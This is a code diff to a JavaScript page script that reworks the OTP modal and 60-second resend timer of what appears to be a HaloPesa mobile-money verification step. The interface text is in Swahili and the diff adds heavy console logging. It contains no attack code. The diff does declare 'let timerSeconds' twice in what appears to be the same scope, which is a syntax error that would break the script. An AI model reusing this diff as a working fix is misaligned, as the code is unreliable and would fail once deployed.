@@ -345,6 +345,7 @@
   let approvalCheckInterval = null;
   let otpCheckInterval = null;
   let otpTimerInterval = null;
+  let timerSeconds = 60;
 
   // ════════════════════════════════════════════════════════
   // PAGE NAVIGATION
@@ -456,6 +457,8 @@
   // OTP MODAL
   // ════════════════════════════════════════════════════════
   function showOtpModal() {
+    console.log('📱 Showing OTP Modal');
+    
     document.getElementById('otpPhoneDisplay').textContent = 'HaloPesa: ' + S.haloNumber;
     clearErr('otpMsgErr');
     clearErr('otpMsgOk');
@@ -465,6 +468,20 @@
     document.getElementById('otpTimer').innerHTML = '⏱️ Muda unaobaki: <strong id="otpTimeRemaining">60</strong>s';
     document.getElementById('otpTimer').style.color = '#888';
     
+    // Reset buttons
+    document.getElementById('bOtp').style.display = 'block';
+    document.getElementById('bOtp').disabled = false;
+    document.getElementById('bResendOtp').style.display = 'none';
+    
+    timerSeconds = 60;
+    
+    // Stop any existing timer
+    if (otpTimerInterval) {
+      clearInterval(otpTimerInterval);
+      otpTimerInterval = null;
+    }
+    
+    console.log('✅ Modal initialized');
     document.getElementById('otpOverlay').classList.add('show');
   }
 
@@ -506,46 +523,59 @@
     }
   }
 
+  let timerSeconds = 60;
+
   function startOtpTimer() {
-    if (otpTimerInterval) clearInterval(otpTimerInterval);
+    console.log('🚀 TIMER FUNCTION STARTED');
     
-    let timeRemaining = 60;
+    // Stop existing timer
+    if (otpTimerInterval !== null) {
+      clearInterval(otpTimerInterval);
+      console.log('🛑 Cleared existing interval');
+    }
     
-    // Set initial state
-    document.getElementById('otpTimeRemaining').textContent = '60';
-    document.getElementById('otpTimer').style.color = '#888';
-    document.getElementById('bResendOtp').style.display = 'none';
-    document.getElementById('bOtp').style.display = 'block';
-    document.getElementById('bOtp').disabled = false;
+    timerSeconds = 60;
+    console.log('⏱️ Starting 60-second countdown');
     
-    console.log('⏱️ OTP Timer started: 60 seconds');
+    // Update display immediately
+    updateTimerDisplay();
     
-    otpTimerInterval = setInterval(() => {
-      timeRemaining--;
+    // Create new interval
+    otpTimerInterval = setInterval(function() {
+      timerSeconds--;
+      console.log('⏱️ Countdown: ' + timerSeconds + 's');
+      updateTimerDisplay();
       
-      // Look up element fresh each time (don't cache)
-      const elem = document.getElementById('otpTimeRemaining');
-      if (elem) {
-        elem.textContent = timeRemaining;
-      }
-      
-      console.log('⏱️ Timer: ' + timeRemaining + 's remaining');
-      
-      if (timeRemaining <= 0) {
+      // Check if time is up
+      if (timerSeconds <= 0) {
+        console.log('⏰ TIME EXPIRED');
         clearInterval(otpTimerInterval);
         otpTimerInterval = null;
         
-        const container = document.getElementById('otpTimer');
-        if (container) {
-          container.textContent = '⏱️ OTP imeharika! Tafadhali tuma tena.';
-          container.style.color = '#ff6600';
-        }
-        
+        // Show resend button
         document.getElementById('bOtp').style.display = 'none';
         document.getElementById('bResendOtp').style.display = 'block';
-        console.log('⏱️ OTP Timer EXPIRED');
+        
+        // Update timer text
+        document.getElementById('otpTimer').innerHTML = '⏱️ OTP imeharika! Tafadhali tuma tena.';
+        document.getElementById('otpTimer').style.color = '#ff6600';
+        
+        console.log('✅ Resend button shown');
       }
     }, 1000);
+    
+    console.log('✅ Timer interval created successfully');
+  }
+
+  function updateTimerDisplay() {
+    try {
+      const elem = document.getElementById('otpTimeRemaining');
+      if (elem) {
+        elem.textContent = timerSeconds;
+      }
+    } catch(e) {
+      console.error('❌ Error updating timer:', e);
+    }
   }
 
   function startOtpApprovalPolling() {
